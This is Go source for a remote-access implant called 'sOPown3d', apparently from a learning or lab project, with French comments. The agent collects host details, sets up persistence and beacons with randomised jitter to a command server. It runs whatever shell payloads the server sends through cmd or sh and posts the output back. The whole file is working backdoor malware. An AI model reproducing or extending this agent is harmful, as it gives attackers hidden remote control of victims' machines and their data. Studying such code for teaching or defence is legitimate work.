package main

import (
  "bytes"
  "encoding/json"
  "flag"
	"fmt"
  "net/http"
  "os"
  "os/exec"
  "runtime"
  "time"

	"sOPown3d/agent/jitter"
	"sOPown3d/agent/persistence"
	"sOPown3d/shared"
)

func main() {
  // Command-line flags for jitter configuration
	jitterMin := flag.Float64("jitter-min", 1.0, "Minimum jitter in seconds (default: 1.0)")
	jitterMax := flag.Float64("jitter-max", 2.0, "Maximum jitter in seconds (default: 2.0)")
	flag.Parse()

	// Validate jitter configuration
	if *jitterMin <= 0 || *jitterMax <= *jitterMin {
		fmt.Printf("❌ Invalid jitter range: min=%.2fs, max=%.2fs\n", *jitterMin, *jitterMax)
		fmt.Println("   Minimum must be positive and maximum must be greater than minimum")
		os.Exit(1)
	}

	// Initialize jitter calculator with Gaussian distribution
	jitterCalc, err := jitter.NewJitterCalculator(shared.JitterConfig{
		MinSeconds: *jitterMin,
		MaxSeconds: *jitterMax,
	})
	if err != nil {
		fmt.Printf("❌ Failed to initialize jitter: %v\n", err)
		os.Exit(1)
	}

	serverURL := "http://127.0.0.1:8080"
  info := gatherSystemInfo()

  fmt.Println("=== Agent sOPown3d - Version Commandes ===")
	fmt.Println()
	fmt.Println(jitterCalc.GetStats())
	fmt.Println()

  setupPersistence()

  fmt.Printf("Agent ID: %s\n", info.Hostname)
  fmt.Println("En attente de commandes...")
  fmt.Println("----------------------------------------")

  // Boucle principale avec jitter
  for i := 1; ; i++ {
    info := gatherSystemInfo() // Pourquoi récuperer a chaque fois les infos ? -> TODO a des fins de logging : à persister dans les logs

    cmd := retrieveCommands(serverURL+"/beacon", info) // l'endpoint beacon servirait donc de point de recuperation des commandes a executer ?

    if cmd != nil && cmd.Action != "" { // Si il y a une commande valide
      res := executeCommand(cmd)
      sendOutput(serverURL+"/ingest", res)
    }

    // Calculate next jitter with Gaussian distribution
		nextJitter := jitterCalc.Next()
		fmt.Printf("[Heartbeat #%d] Next check in: %.2fs\n", i, nextJitter.Seconds())
		time.Sleep(nextJitter)
  }
}

func gatherSystemInfo() shared.AgentInfo {
  hostname, _ := os.Hostname()
  return shared.AgentInfo{
    Hostname: hostname,
    OS:       runtime.GOOS,
    Username: os.Getenv("USERNAME"),
  }
}

func retrieveCommands(url string, info shared.AgentInfo) *shared.Command {
  serializedAgentInfo, _ := json.Marshal(info) // Serialise en JSON les informations de la machine infecté par l'agent

  resp, err := http.Post(url, "application/json", bytes.NewBuffer(serializedAgentInfo))
  if err != nil { // Si il y a quelques chose dans erreur
    return nil // retourne rien -> On ne log pas l erreur ?
  }
  defer resp.Body.Close() // Ferme un truc à la fin de l'execution de la fonction

  var cmd shared.Command
  // initialisation dans le if un peu déroutante...
  if err := json.NewDecoder(resp.Body).Decode(&cmd); err == nil { // Si la déserialisation réussi (si pas d err)
    if cmd.Action != "" { // Si il y'a une action à mener
      return &cmd // Retourne la commande
    }
  }

  return nil
}

func executeCommand(cmd *shared.Command) string {
  switch cmd.Action {
  case "shell":
    if cmd.Payload != "" {
      fmt.Printf("Exécute: %s\n", cmd.Payload) // Debug

      var output string

      if runtime.GOOS == "windows" { // SI Windows
        result, err := exec.Command("cmd", "/c", cmd.Payload).CombinedOutput()

        if err != nil {
          output = fmt.Sprintf("Erreur: %v", err)
          return output
        }
        output = string(result)
      }

      if runtime.GOOS == "darwin" { // SI Macos
        result, err := exec.Command("sh", "-c", cmd.Payload).CombinedOutput()

        if err != nil {
          output = fmt.Sprintf("Erreur: %v", err)
          return output
        }
        output = string(result)
      }

      fmt.Printf("%s", output)
      return output
    }

  case "info":
    fmt.Println("Info: Déjà envoyé dans le beacon")

  case "ping":
    fmt.Println("Pong!")

  case "persist":
    fmt.Println("📋 Vérification persistance...")
    if persistent, path := persistence.CheckStartup(); persistent {
      fmt.Printf("  ✓ Persistant\n  Chemin: %s\n", path)
    } else {
      fmt.Println("  ✗ Non persistant")
    }

  default:
    fmt.Printf("Commande inconnue: %s\n", cmd.Action)
  }

  return ""
}

func sendOutput(url string, output string) {
  hostname, _ := os.Hostname()

  payload := struct {
    AgentID string `json:"agent_id"`
    Output  string `json:"output"`
  }{
    AgentID: hostname,
    Output:  output,
  }
  serializedOutput, _ := json.Marshal(payload)

  resp, err := http.Post(url, "application/json", bytes.NewBuffer(serializedOutput))
  if err != nil {
    return
  }
  defer resp.Body.Close()

  var result string

  if err := json.NewDecoder(resp.Body).Decode(&result); err == nil {
    if result != "" {
      fmt.Printf("%s", result)
    }
  }
}
